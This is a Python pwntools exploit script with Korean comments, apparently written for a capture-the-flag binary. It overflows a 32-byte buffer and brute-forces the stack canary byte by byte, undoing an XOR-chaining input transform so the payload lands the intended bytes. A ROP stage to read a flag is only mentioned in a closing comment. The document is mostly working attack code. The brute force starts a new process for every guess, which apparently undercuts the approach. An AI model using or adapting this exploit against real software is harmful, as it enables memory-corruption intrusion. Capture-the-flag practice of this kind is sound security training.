#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import time

context.log_level = 'info'
FILE_NAME = "./prob"

# 분석 결과:
#  - 함수 내부에서 buf = 32바이트 사용
#  - 그 뒤로 canary = 8바이트
BUF_SIZE   = 32
CANARY_LEN = 8
CANARY_POS = BUF_SIZE  # canary가 buf 직후에 있다고 가정

# =============================================================================
# (A) final_buf[] -> 실제 read()로 전송할 input[] 을 역산
#
#   바이너리에 있는 로직 (의사코드):
#       buf[0] = input[0]
#       for i in 1..(n-1):
#           buf[i] = input[i] XOR buf[i-1]
#
#   => 최종 buf[i] (메모리상) = final_buf[i]
#      input[i] = final_buf[i] XOR final_buf[i-1]
# =============================================================================
def build_actual_input(final_buf: bytes) -> bytes:
    """XOR 연쇄 로직을 반영해, 우리가 원하는 최종 buf -> 전송할 payload 계산"""
    if not final_buf:
        return b""

    out = bytearray(len(final_buf))
    # 첫 바이트는 동일
    out[0] = final_buf[0]
    # 이후 바이트들은 final_buf[i] = input[i] XOR final_buf[i-1]
    #  => input[i] = final_buf[i] XOR final_buf[i-1]
    for i in range(1, len(final_buf)):
        out[i] = final_buf[i] ^ final_buf[i - 1]
    return bytes(out)


# =============================================================================
# (B) canary를 한 바이트씩 찾는 함수
#  - 각 바이트 [0..7]에 대해 0x00..0xff를 시도
#  - 틀린 값이면 세그폴트 -> 프로세스 종료
#  - 맞으면 "정상 동작" -> "You entered:" 라인을 수신 가능
# =============================================================================
def leak_canary():
    known_canary = b""

    for idx in range(CANARY_LEN):
        log.info(f"[*] Finding canary byte {idx}/{CANARY_LEN}")

        found_this_byte = False
        for guess in range(256):
            # 1) 새 프로세스 실행
            p = process(FILE_NAME)

            # 2) "Input: " 프롬프트를 기다림 (실제 바이너리에 맞춰 조정)
            try:
                p.recvuntil(b"Input: ", timeout=1)
            except:
                # 제대로 못 받으면 이 시도는 어차피 불안정 -> 종료
                p.close()
                continue

            # 3) 최종 buf 구상
            #    - 앞부분(0..31)은 'A'로
            #    - CANARY_POS + (이미 찾은 바이트들) = known_canary
            #    - CANARY_POS + idx = 이번 guess
            final_buf = bytearray(BUF_SIZE + CANARY_LEN)
            for i in range(BUF_SIZE):
                final_buf[i] = 0x41  # 'A'
            # 이미 맞춘 바이트 복사
            for i in range(idx):
                final_buf[CANARY_POS + i] = known_canary[i]
            # 이번 guess
            final_buf[CANARY_POS + idx] = guess

            # 4) XOR 고려해서 전송할 payload 계산
            payload = build_actual_input(final_buf)

            # 5) 바이너리는 read(0, buf, 0x100)
            #    "exit" 토큰 생기지 않도록 적당히 전송
            p.send(payload)

            # 6) 잠시 대기 후, poll()로 종료 여부 확인
            time.sleep(0.1)
            retcode = p.poll()
            if retcode is not None:
                # 이미 종료됨 => 아마 세그폴트 => 오답
                p.close()
                continue

            # 7) 살아있다면, "You entered:" 문구를 recvuntil() 시도
            try:
                p.recvuntil(b"You entered:", timeout=0.5)
            except EOFError:
                # 못 받으면 죽었거나 종료됨
                p.close()
                continue
            except Timeout:
                # 시간 내에 못 받음 => 마찬가지로 실패
                p.close()
                continue

            # 여기 도달했으면 "정상동작"했다고 판단
            found_this_byte = True
            known_canary += p8(guess)
            log.info(f"    -> Found canary byte = 0x{guess:02x}")
            p.close()
            break

        if not found_this_byte:
            log.error("[-] Failed to find valid canary byte at index %d" % idx)
            return None

    log.success(f"[+] Canary found: {known_canary.hex()}")
    return known_canary


def main():
    canary = leak_canary()
    if not canary:
        log.error("Could not leak canary!")
        return

    log.info(f"[CANARY] = {canary.hex()}")
    # 이후 ROP 등 원하는 동작을 진행 (open/read/write "flag" 등)


if __name__ == "__main__":
    main()
